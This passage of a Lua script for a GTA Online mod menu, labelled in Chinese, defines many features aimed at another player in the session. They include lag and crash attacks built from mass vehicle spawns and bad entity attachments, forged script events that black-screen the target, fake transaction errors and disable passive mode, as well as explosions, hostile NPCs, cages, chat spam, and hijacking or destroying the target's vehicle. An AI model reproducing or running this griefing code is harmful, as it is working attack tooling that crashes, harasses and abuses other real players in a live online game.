			menu.notify(player.get_player_name(pid) .. " 不在车内", "",1, RGBAToInt(0, 255, 0))
		end
		system.wait(5000)
	end
end)

Invalid_Apartment_Invite= menu.add_feature("无限黑屏","toggle",spoof.id,function(k)
	while k.on do
		N.sEv(0xF5CB92DB, pid,get_full_arg_table())	
		N.sEv(0xf5cb92db, pid,get_full_arg_table())	
		c.wait(10)			
	end
	k.on = false			
end)

menu.add_feature("火柱喷射", "toggle", spoof.id, function(playerfeat_toggle)
while playerfeat_toggle.on do
local pos = player.get_player_coords(pid)
pos.z = pos.z -1
fire.add_explosion(pos, 12, true, false, 0, pid)
system.wait(0)
end
end)

menu.add_feature("蒸汽喷射", "toggle", spoof.id, function(playerfeat_toggle)
while playerfeat_toggle.on do
local pos = player.get_player_coords(pid)
pos.z = pos.z -1
fire.add_explosion(pos, 11, true, false, 0, pid)
system.wait(0)
end
end)

menu.add_feature("随机爆炸", "toggle", spoof.id, function(feat)
if feat.on then
fire.add_explosion(player.get_player_coords(pid), 2, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 3, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 4, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 5, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 6, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 7, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 8, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 9, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 10, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 11, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 12, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 13, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 14, true, false, 1, pid)
fire.add_explosion(player.get_player_coords(pid), 15, true, false, 1, pid)
end
system.wait(500)
return HANDLER_CONTINUE
end)

kickcar = menu.add_feature("清空任务","action",spoof.id,function()
	local pedp = player.get_player_ped(pid)
	ped.clear_ped_tasks_immediately(pedp)
end)

menu.add_feature("使他掉帧", "toggle",spoof.id,function(feat)                                                                                                                                                                                                                                                        
if feat.on then
local pos = player.get_player_coords(pid)
local veh_hash = 0x4FAF0D70
streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end
local tableOfVehicles = {}
for i = 1, 75 do
tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}
streaming.set_model_as_no_longer_needed(veh_hash)
end
return HANDLER_CONTINUE
end)

menu.add_feature("拖车掉帧", "toggle",spoof.id,function(feat)                                                                                                                                                                                                                                                     
if feat.on then
local pos = player.get_player_coords(pid)
local veh_hash = 0x810369E2 
streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end
local tableOfVehicles = {}
for i = 1, 75 do
tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}
streaming.set_model_as_no_longer_needed(veh_hash)
end
return HANDLER_CONTINUE
end)

menu.add_feature("货机掉帧", "toggle",spoof.id,function(feat)
    if feat.on then
        local pos = player.get_player_coords(pid)
        local veh_hash = 0x15F27762
        streaming.request_model(veh_hash)
        while (not streaming.has_model_loaded(veh_hash)) do
            system.wait(10)
        end
        local tableOfVehicles = {}
        for i = 1, 75 do
            tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
        end
        system.wait(1000)
        for i = 1, #tableOfVehicles do
            entity.delete_entity(tableOfVehicles[i])
        end
        tableOfVehicles = {}
        streaming.set_model_as_no_longer_needed(veh_hash)
    end
    return HANDLER_CONTINUE
end)

_U_spoof_c=menu.add_feature("尾焰弹射",'toggle',spoof.id,function(a)
	while a.on do
		system.yield(0)
		local rot=entity.get_entity_rotation(player.get_player_ped(pid))
		rot:transformRotToDir()
		rot=v3(rot.x*3,rot.y*3,rot.z*3)
		if requestmodel(3052358707) then
			spoof_veh_c=vehicle.create_vehicle(3052358707,player.get_player_coords(pid)+rot,0,true,false)
			entity.set_entity_rotation(spoof_veh_c,entity.get_entity_rotation(player.get_player_ped(pid)))
			vehicle.set_vehicle_engine_on(spoof_veh_c,true,true,true)
			vehicle.set_vehicle_rocket_boost_active(spoof_veh_c,true)
			system.yield(100)
			entity.delete_entity(spoof_veh_c)
		end
	end
end)

airs= menu.add_feature("RPG爆炸","action",spoof.id,function()
    local offset= v3(0,0,0)
    airshash = gameplay.get_hash_key("vehicle_weapon_trailer_dualaa")
    gameplay.shoot_single_bullet_between_coords(player.get_player_coords(pid), player.get_player_coords(pid) + offset, 10000.00, airshash, 0, true, false, 10000.0)
end)

menu.add_feature("放狗咬他","action",spoof.id,function()
	requestmodel(0x4E8F95A2)  
	local pos = player.get_player_coords(pid)
	pos.y = pos.y + 2
	pcped = ped.create_ped(28, 0x4E8F95A2, pos, 0, true, false)
	ped.set_ped_combat_attributes(pcped, 46, true)
	ped.set_ped_combat_attributes(pcped, 52, true)
	ped.set_ped_combat_attributes(pcped, 1, true)
	ped.set_ped_combat_attributes(pcped, 2, true)
	entity.set_entity_god_mode(pcped, true)
	ped.set_ped_combat_range(pcped,50)
	local wjped = player.get_player_ped(pid)
	ai.task_combat_ped(pcped, wjped, 0, 16)
end)

menu.add_feature("关门放狗","action",spoof.id,function()
	requestmodel(0x4E8F95A2)
	local pos = player.get_player_coords(pid)
	pos.z = pos.z + 0.95  
	local pos1 = player.get_player_coords(pid)
	pos1.z = pos1.z - 0.90
	local cage = gameplay.get_hash_key("prop_feeder1_cr")
	streaming.request_model(cage)
	object.create_object(cage, pos, true, true)
	object.create_object(cage, pos1, true, true)
	local pos = player.get_player_coords(pid)
	pos.z = pos.z + 2
	pcped = ped.create_ped(28, 0x4E8F95A2, pos, 0, true, false)
	ped.set_ped_combat_attributes(pcped, 46, true)
	ped.set_ped_combat_attributes(pcped, 52, true)
	ped.set_ped_combat_attributes(pcped, 1, true)
	ped.set_ped_combat_attributes(pcped, 2, true)
	entity.set_entity_god_mode(pcped, true)
	ped.set_ped_combat_range(pcped,50)
	local wjped = player.get_player_ped(pid)
	ai.task_combat_ped(pcped, wjped, 0, 16)
end)

ramcarplayer = menu.add_feature("载具撞击","action",spoof.id,function()
local head = player.get_player_heading(pid)
local car = spawn_vehicle(3581397346,player.get_player_coords(pid),head)
vehicle.set_vehicle_forward_speed(car,1000)
system.wait(1000)
entity.delete_entity(car)
end)

ramcarplayer1 = menu.add_feature("载具撞击2","action",spoof.id,function()
local head = player.get_player_heading(pid)
local car = spawn_vehicle(-827162039,player.get_player_coords(pid),head)
vehicle.set_vehicle_forward_speed(car,1000)
system.wait(500)
entity.delete_entity(car)
end)

dada = menu.add_feature("闪屏","action",spoof.id, function()
    for i = 0 ,500 do
        pos = player.get_player_coords(pid)
        skylift = spawn_vehicle(-42959138, pos,0)
        entity.set_entity_god_mode(skylift, true)
        c.wait(50)
        entity.delete_entity(skylift)
        c.wait(1)
    end
end)

crash = menu.add_feature("错误附加","action",spoof.id, function()
	pedp = player.get_player_ped(pid)
	pos = player.get_player_coords(pid)
	towtruck = spawn_vehicle(-1323100960, pos,0)
	skylift = spawn_vehicle(-692292317, pos,0)
	cargobob = spawn_vehicle(-692292317, pos,0)	
	cargobob2 = spawn_vehicle(-692292317, pos,0)
	cargobob1 = spawn_vehicle(-692292317, pos,0)
	handler = spawn_vehicle(444583674, pos,0)			
	entity.attach_entity_to_entity(cargobob,skylift, 0, v3(0,0,0.2), v3(0,0,0),false, true, false, 0, true)
	entity.attach_entity_to_entity(cargobob1,skylift, 0, v3(0,0,-0.2), v3(0,0,0),false, true, false, 0, true)
	entity.attach_entity_to_entity(handler,skylift, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
	entity.attach_entity_to_entity(towtruck,skylift, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
	entity.attach_entity_to_entity(cargobob2,towtruck, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
	entity.attach_entity_to_entity(skylift,pedp, 0, v3(0,0,0), v3(0,0,0),false, true, false, 0, true)
end)

transaction = menu.add_feature("错误报警","action",spoof.id,function(feat)
if feat.on then
script.trigger_script_event(1302185744,pid,{pid,2147483647,1,1,script.get_global_i(1630317 + (1 + (pid * 595) + 506)),
script.get_global_i(1652336 + 9),script.get_global_i(1652336 + 10),1})
end
feat.on = false
end)

sharkattackplayer = menu.add_feature("鲨鱼吞噬","action",spoof.id,function()
pos = player.get_player_coords(pid)
pedp = player.get_player_ped(pid)
NPC = Cped(26,0x06C3F072, pos , 0)
entity.freeze_entity(NPC, true)
entity.set_entity_rotation(NPC, v3(90, 0, 0))
fire.add_explosion(pos, 4, false, false, 1.0, pedp)
fire.add_explosion(pos, 13, true, false, 0, pedp)
end)

menu.add_feature("一直爬隐形梯子", "action", spoof.id, function()
local playerped3 = player.get_player_ped(pid)
local pos = v3()
pos.x = pos.x + 1.55
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.z = pos.z + 1.55
pos.x = pos.x + 1.55
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.z = pos.z - 2.00
attach_object1132 = object.create_object(-1951226014, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.x = pos.x + 1.55
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
local rot = entity.get_entity_rotation(attach_object1132)
rot.y = 180
entity.set_entity_rotation(attach_object1132, rot)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.x = pos.x + 0.45
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.x = pos.x + 0.80
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.z = pos.z - 2.00
pos.x = pos.x + 0.80
pos.y = pos.y + 3.35
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
local pos = v3()
pos.x = pos.x + 1.30
pos.y = pos.y + 3.95
attach_object1132 = object.create_object(1888301071, pos, true, false)
entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
entity.set_entity_visible(attach_object1132, false)
end)

busattack = menu.add_feature("巴士轰炸","action",spoof.id,function(k)
for i = 0 , 30 do
spawn_vehicle(3581397346,player.get_player_coords(pid),0)
end
c.wait(10)
allvehs = vehicle.get_all_vehicles()
for i = 1,#allvehs do
ppos = entity.get_entity_coords(player.get_player_ped(pid))
get_control_of_entity(allvehs[i], 300)
entity.set_entity_coords_no_offset(allvehs[i], ppos)
end
c.wait(500)
end)
kosatkaattack = menu.add_feature("虎鲸轰炸","action",spoof.id,function(k)
for i = 0 , 30 do
spawn_vehicle(1336872304,player.get_player_coords(pid),0)
end
c.wait(10)
allvehs = vehicle.get_all_vehicles()
for i = 1,#allvehs do
ppos = entity.get_entity_coords(player.get_player_ped(pid))
get_control_of_entity(allvehs[i], 300)
entity.set_entity_coords_no_offset(allvehs[i], ppos)
end
c.wait(500)
end)
cargoplaneattack = menu.add_feature("货机轰炸","action",spoof.id,function(k)
for i = 0 , 30 do
spawn_vehicle(368211810,player.get_player_coords(pid),0)
end
c.wait(10)
allvehs = vehicle.get_all_vehicles()
for i = 1,#allvehs do
ppos = entity.get_entity_coords(player.get_player_ped(pid))
get_control_of_entity(allvehs[i], 300)
entity.set_entity_coords_no_offset(allvehs[i], ppos)
end
c.wait(500)
end)

menu.add_feature("杀手攻击", "action", spoof.id, function()
local hash = gameplay.get_hash_key("mp_m_weapexp_01")
streaming.request_model(hash)
while (not streaming.has_model_loaded(hash)) do
system.wait(0)
end
for i = 1, 10 do
local pos = entity.get_entity_coords(player.get_player_ped(pid))
pos.x = pos.x + math.random(-20, 20+i)
pos.y = pos.y + math.random(-20, 20)	 
local Peds = ped.create_ped(4, hash, pos, 1.0, true, false)
weapon.give_delayed_weapon_to_ped(Peds, 0x476BF155, 0, true)
ped.set_ped_health(Peds, 410)
ped.set_ped_combat_ability(Peds, 2)
ped.set_ped_combat_attributes(Peds, 5, true)
ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
ped.set_ped_relationship_group_hash(Peds, 0x84DCFAAD)
gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(Peds), entity.get_entity_coords(Peds) + v3(0, 0.0, 0.1), 0, 453432689, player.get_player_ped(pid), false, true, 100)
streaming.set_model_as_no_longer_needed(hash)   
end
end)
	
ramcarplayer = c.df("撞击玩家","action",spoof.id,function(feat)
local offset = v3()
local rot = v3()
rot.x=math.random(-90,90)
rot.y=math.random(-90,90)
rot.z=math.random(-90,90)
car = spawn_vehicle(3581397346,player.get_player_coords(pid),0)
vehicle.set_vehicle_forward_speed(car,1000)
local pedp = player.get_player_ped(pid)
c.wait(500)
entity.attach_entity_to_entity(car, pedp, 0, offset, rot, true, true, false, 0, true)
end)

menu.add_feature("弹飞玩家", "action", spoof.id, function()
local pos_start = player.get_player_coords(pid)
local pos_end = player.get_player_coords(pid)
pos_start.x = pos_start.x + 2
pos_end.z = pos_end.z - 1
pos_end.x = pos_end.x + 1
gameplay.shoot_single_bullet_between_coords(pos_start, pos_end, 0, 0xAF3696A1, pid, true, false, 1)
end)

all_arms = menu.add_feature('给予武器', 'action', spoof.id, function()
for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
weapon.give_delayed_weapon_to_ped(player.get_player_ped(pid), weapon_hash, 0, 0)
boammo,maxammo = weapon.get_max_ammo(player.get_player_ped(pid),weapon_hash)
weapon.set_ped_ammo(player.get_player_ped(pid),weapon_hash,maxammo)
end
end)

all_ammo = menu.add_feature('给予弹药', 'action', spoof.id, function()
for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
boammo,maxammo = weapon.get_max_ammo(player.get_player_ped(pid),weapon_hash)
weapon.set_ped_ammo(player.get_player_ped(pid),weapon_hash,maxammo)
end
end)

removeplayerweapon = menu.add_feature("移除武器","action",spoof.id,function()
local pedp = player.get_player_ped(pid)
weapon.remove_all_ped_weapons(pedp)
end)

zaizang = menu.add_feature("栽赃玩家","action",spoof.id,function()
for i = 0,31 do
if i ~= player.player_id() and i ~= pid then
pedp = player.get_player_ped(i)
ownerped = player.get_player_ped(pid)
pos = player.get_player_coords(i)
fire.add_explosion(pos,0,true,false,0,ownerped)
end
end
end)

rollsession = menu.add_feature("电击玩家","toggle",spoof.id,function(feat)
while feat.on do
local hash = 0x3656C8C1 
pos = player.get_player_coords(pid)
local offset = v3()
offset.x = 0
offset.y = 0
offset.z = 0
gameplay.shoot_single_bullet_between_coords(pos+ v3(0, 0, 2), player.get_player_coords(pid) + offset, 1, hash, 0, true, false, 10000.0)
system.wait(50)
end
feat.on = false
end)

soundnofity = c.df("声音骚扰", "toggle",spoof.id, function(k)
while k.on do
pedp = player.get_player_ped(pid)
audio.play_sound_from_entity(2,"Switch",pedp,"GTAO_Vision_Modes_SoundSet")
c.wait(100)
end
k.on = false
end)

Transaction_Failed= c.df("交易错误","toggle",spoof.id,function(k)
while k.on do			
N.sEv(1302185744, pid,get_full_arg_table())	
c.wait(100)
end
k.on = false		
end)

huojianyu = c.df("火箭雨","toggle",spoof.id,function(feat)
while feat.on do
local hash = gameplay.get_hash_key("weapon_airstrike_rocket")
local pos = v3()
pos = player.get_player_coords(pid)
pos.z = pos.z + 10.0
local offset = v3()
offset.x = math.random(-20,20)
offset.y = math.random(-20,20)
offset.z = math.random(-20,20)
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash, 0, true, false, 10000.0)
c.wait(50)
end
feat.on = false
end)


zdanyu = c.df("子弹雨袭击玩家","toggle",spoof.id,function(feat)
while feat.on do
local hash = gameplay.get_hash_key("weapon_machinepistol")
local pos = v3()
pos = player.get_player_coords(pid)
pos.z = pos.z + 10.0
local offset = v3()
offset.x = 0.0
offset.y = 0.0
offset.z = 0.0
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash,0, true, false, 10000.0)
c.wait(1)
pos.y = pos.y + 10.0
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash,0, true, false, 10000.0)
c.wait(1)
pos.x = pos.x + 10.0
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash,0, true, false, 10000.0)
c.wait(1)
end
feat.on = false
end)


lizhitexiao = c.df("烟雾","toggle",spoof.id,function(feat)
while feat.on do 
graphics.set_next_ptfx_asset("scr_rcbarry2")
while not graphics.has_named_ptfx_asset_loaded("scr_rcbarry2") do
graphics.request_named_ptfx_asset("scr_rcbarry2")
c.wait(0)
end
graphics.start_networked_particle_fx_non_looped_at_coord("scr_clown_death",player.get_player_coords(pid),v3(60, 0, 0),2,true,true,true)
c.wait(50)
end
feat.on = false
end)


fireloop= c.df("喷火","toggle",spoof.id,function(k)
while k.on do
pedp = player.get_player_ped(pid)
pos = player.get_player_coords(pid)
fire.add_explosion(pos, 12, true, false, 0, pedp)
c.wait(10)
end
k.on = false
end)	


waterloop= c.df("喷水","toggle",spoof.id,function(k)
while k.on do	
pedp = player.get_player_ped(pid)
pos = player.get_player_coords(pid)	
fire.add_explosion(pos, 13, true, false, 0, pedp)		
c.wait(10)		
end	
k.on = false		
end)

		
fuckcam= c.df("摇晃屏幕","toggle",spoof.id,function(k)		
while k.on do		
pedp = player.get_player_ped(pid)		
pos = player.get_player_coords(pid)		
fire.add_explosion(pos, 4, false, false, 100.0, pedp)		
c.wait(10)				
end		
k.on = false				
end)		

		
explosionsingerplayer= c.df("爆炸玩家","action",spoof.id,function(k)					
pedp = player.get_player_ped(pid)		
pos = player.get_player_coords(pid)		
fire.add_explosion(pos, 0, true, false, 0, pedp)		
end)
		
fuckchat = c.df("哒咩","action",spoof.id,function(k)		
	playername = player.get_player_name(pid)		
	playertxt = playername.."哒咩"		
	for i = 0 , 20 do	
		network.send_chat_message(playertxt,false)	
	end	
end)

frozen = menu.add_feature("困住玩家","action",spoof.id,function()
local pos = player.get_player_coords(pid)
pos.x = pos.x + 1.5
pos.y = pos.y + 0.5
pos.z = pos.z -2.5
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(0, 90, 0))
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(90, 0, 0))
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(0, 0, 90))
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(0, -90, 0))
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(-90, 0, 0))
entity.set_entity_rotation(object.create_object(552807189, pos, true, false), v3(0, 0, -90))
end)

cable = menu.add_feature("缆车困住","action",spoof.id,function()
local hash = gameplay.get_hash_key("prop_gold_cont_01")
pos = player.get_player_coords(pid)
pos.z = pos.z -2.4
cable = object.create_object(3561133533,pos,true,false)
entity.freeze_entity(cable, true)
end)

passiveblock = menu.add_feature("禁用被动模式","action",spoof.id,function(k)
for i = 0 , 5 do		
N.sEv(-909357184,pid,{1, 1})	
N.sEv(-909357184, pid, get_full_arg_table())
c.wait(50)	
end		
end)

cloneselftop = c.df("克隆玩家抬棺","action",spoof.id,function(k)
pos = player.get_player_coords(pid)
pedp = player.get_player_ped(pid)
pos.z = pos.z + 0.6
coffin = object.create_object(2193278353,pos,true,false)
entity.attach_entity_to_entity(coffin,pedp, 0, v3(0,0,0.6), v3(0.0,0,0.0), true, true, false, 0, true)		
npc1 = ped.clone_ped(pedp)
get_control_of_entity(npc1,300)
entity.attach_entity_to_entity(npc1,coffin, 0, v3(0.25,0,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc1, true)			
get_control_of_entity(npc2,300)
npc2 = ped.clone_ped(pedp)
entity.attach_entity_to_entity(npc2,coffin, 0, v3(-0.25,0,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc2, true)	
get_control_of_entity(npc3,300)
npc3 = ped.clone_ped(pedp)
entity.attach_entity_to_entity(npc3,coffin, 0, v3(0.25,0.5,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc3, true)		
get_control_of_entity(npc4,300)
npc4 = ped.clone_ped(pedp)
entity.attach_entity_to_entity(npc4,coffin, 0, v3(-0.25,0.5,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc4, true)		
get_control_of_entity(npc5,300)
npc5 = ped.clone_ped(pedp)
entity.attach_entity_to_entity(npc5,coffin, 0, v3(0.22,-0.5,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc5, true)	
get_control_of_entity(npc6,300)
npc6 = ped.clone_ped(pedp)
entity.attach_entity_to_entity(npc6,coffin, 0, v3(-0.22,-0.5,-0.4),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc6, true)	
end)

tomoxingtaiguan = menu.add_feature("抬棺玩家","action",spoof.id,function(k)
pos = player.get_player_coords(pid)
local pedp = player.get_player_ped(pid)
pos.z = pos.z + 0.6
coffin = object.create_object(2193278353,pos,true,false)
entity.attach_entity_to_entity(coffin,pedp, 0, v3(0,-1,0.8), v3(0.0,0,0.0), true, true, false, 0, true)
npc1 = Cped(26,0x9B22DBAF,pos,0)
get_control_of_entity(npc1,300)
entity.attach_entity_to_entity(npc1,coffin, 0, v3(0.55,0,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc1, true)
get_control_of_entity(npc2,300)
npc2 = Cped(26,0x9B22DBAF,pos,0)
entity.attach_entity_to_entity(npc2,coffin, 0, v3(-0.55,0,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc2, true)
get_control_of_entity(npc3,300)
npc3 = Cped(26,0x9B22DBAF,pos,0)
entity.attach_entity_to_entity(npc3,coffin, 0, v3(0.55,0.5,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc3, true)
get_control_of_entity(npc4,300)
npc4 = Cped(26,0x9B22DBAF,pos,0)
entity.attach_entity_to_entity(npc4,coffin, 0, v3(-0.55,0.5,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc4, true)
get_control_of_entity(npc5,300)
npc5 = Cped(26,0x9B22DBAF,pos,0)
entity.attach_entity_to_entity(npc5,coffin, 0, v3(0.55,-0.5,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc5, true)
get_control_of_entity(npc6,300)
npc6 = Cped(26,0x9B22DBAF,pos,0)
entity.attach_entity_to_entity(npc6,coffin, 0, v3(-0.55,-0.5,-0.6),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc6, true)
end)

vehiclecar = menu.add_feature("载具选项", "parent", playerlist[pid].id,function(feat)
end)

LockDoorforall = menu.add_feature("载具锁门","action",vehiclecar.id,function()
	pedp = player.get_player_ped(pid)
	playercar = ped.get_vehicle_ped_is_using(pedp)
	get_control_of_entity(playercar, 500)
	vehicle.set_vehicle_doors_locked_for_all_players(playercar, true)
	menu.notify("Done")
end)

drivecarairsrike = menu.add_feature("禁用载具","action",vehiclecar.id,function()
	pos = player.get_player_coords(pid)
	local offset = v3(0,0,0)
	local rot = v3(0.0,0,0.0)
	local pedp = player.get_player_ped(pid)
	demiball = object.create_object(148511758,pos,true,false)
	get_control_of_entity(demiball, 300)
	entity.set_entity_god_mode(demiball, true)
	entity.set_entity_visible(demiball,false)
	entity.attach_entity_to_entity(demiball, pedp, 0, offset, rot, true, true, false, 0, true)
end)

getcar = menu.add_feature("驾驶载具","action",vehiclecar.id,function(k)
pedmy = player.get_player_ped(c.me())
pedp = player.get_player_ped(pid)
pos = player.get_player_coords(c.me())	
carp = ped.get_vehicle_ped_is_using(pedp)
get_control_of_entity(carp, 30)
ped.clear_ped_tasks_immediately(pedp)
c.wait(500)
get_control_of_entity(pedmy, 30)
ped.set_ped_into_vehicle(pedmy,carp,-1)		
end)
	
engine = menu.add_feature("破坏载具","action",vehiclecar.id,function()
	pedp = player.get_player_ped(pid)
	playercar = ped.get_vehicle_ped_is_using(pedp)
	get_control_of_entity(playercar, 500)
	vehicle.set_vehicle_engine_health(playercar, -100)
end)

setvehspeed = menu.add_feature("发射载具","action",vehiclecar.id,function(k)
pedp = player.get_player_ped(pid)
car = ped.get_vehicle_ped_is_using(pedp)
get_control_of_entity(car,500) 
vehicle.set_vehicle_forward_speed(car, 1000)
end)

menu.add_feature("关闭载具无敌", "action", vehiclecar.id, function()
plyveh = player.get_player_vehicle(pid)
while not network.has_control_of_entity(plyveh) do
network.request_control_of_entity(plyveh)
system.wait(10)
end
entity.set_entity_god_mode(plyveh, false)
return HANDLER_POP
end)

local achieved, count = false, 0
menu.add_feature("关闭控制与无敌", "toggle", vehiclecar.id, function(feat)
if feat.on then
	plyveh = player.get_player_vehicle(pid)
	network.request_control_of_entity(plyveh)
	system.wait(10)
	if not network.has_control_of_entity(plyveh) then
	network.request_control_of_entity(plyveh)
	system.wait(10)
	entity.set_entity_god_mode(plyveh, false)
	elseif network.has_control_of_entity(plyveh) then
	achieved = true
	entity.set_entity_god_mode(plyveh, false)
	if count <= 1 then
	menu.notify("已取得控制权", "车辆控制请求")
	end
	end
	if achieved == true and count >= 20000 then
	count = 0
	elseif achieved == true and count < 20000 then
	count = count + 1
	end
	return HANDLER_CONTINUE
end
achieved = false
count = 0
return HANDLER_POP
end)

menu.add_feature("玩家车辆向前冲", "action", vehiclecar.id, function()
plyveh = player.get_player_vehicle(pid)
if plyveh ~= nil then
network.request_control_of_entity(plyveh)
vehicle.set_vehicle_forward_speed(plyveh, 200000.00)
end
network.request_control_of_entity(plyveh)
vehicle.set_vehicle_forward_speed(plyveh, 200000.00)
end)

menu.add_feature("玩家车辆以极快速度向前冲", "action", vehiclecar.id, function()
plyveh = player.get_player_vehicle(pid)
if plyveh ~= nil then
network.request_control_of_entity(plyveh)
system.wait(10)
vehicle.set_vehicle_undriveable(player.get_player_vehicle(pid), true)
vehicle.set_vehicle_forward_speed(plyveh, 90000.00)
vehicle.set_vehicle_undriveable(player.get_player_vehicle(pid), false)
vehicle.set_vehicle_forward_speed(plyveh, 9000.00)
end
vehicle.set_vehicle_forward_speed(plyveh, 9000.00)
end)

menu.add_feature("玩家车辆一直向前冲", "toggle", vehiclecar.id, function(feat)
if feat.on then
pped = player.get_player_ped(pid)
plyveh = player.get_player_vehicle(pid)
if plyveh ~= nil then
network.request_control_of_entity(plyveh)
vehicle.set_vehicle_out_of_control(plyveh, false, true)
end
network.request_control_of_entity(plyveh)
vehicle.set_vehicle_out_of_control(plyveh, false, true)
vehicle.set_vehicle_forward_speed(plyveh, 200000.00)
end
return HANDLER_CONTINUE
end)

menu.add_feature("循环摧毁载具", "toggle", vehiclecar.id, function(feat)
if feat.on then
system.wait(2)
script.trigger_script_event(-1662268941, pid, {-1, 0})
end
return HANDLER_CONTINUE
end)

menu.add_feature("车辆失控", "action", vehiclecar.id, function()
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
entity.set_entity_max_speed(veh, 45000)
vehicle.set_vehicle_forward_speed(veh, 1000)
entity.apply_force_to_entity(veh, 3, 4, 4, 5, 0, 0, 0, true, true)
system.yield(0)
end)

menu.add_feature("冻结载具", "action", vehiclecar.id, function(feat)
if feat.on then
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
entity.freeze_entity(veh, true)
end
end)

menu.add_feature("解冻载具", "action", vehiclecar.id, function(feat)
if feat.on then
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
entity.freeze_entity(veh, false)
end
end)
menu.add_feature("设置载具无限最高速(先观看玩家)", "action", vehiclecar.id, function(feat)
if feat.on then
menu.notify("当你离该玩家较近或观看该玩家时生效", "", 3, RGBAToInt(151, 0, 255, 255))
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
vehicle.modify_vehicle_top_speed(veh, 99999999999999)
end
end)

menu.add_feature("设置载具最高速度为1(先观看玩家)", "action", vehiclecar.id, function(feat)
if feat.on then
menu.notify("当你离该玩家较近或观看该玩家时生效", "", 3, RGBAToInt(151, 0, 255, 255))
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
vehicle.modify_vehicle_top_speed(veh, 1)
end
end)

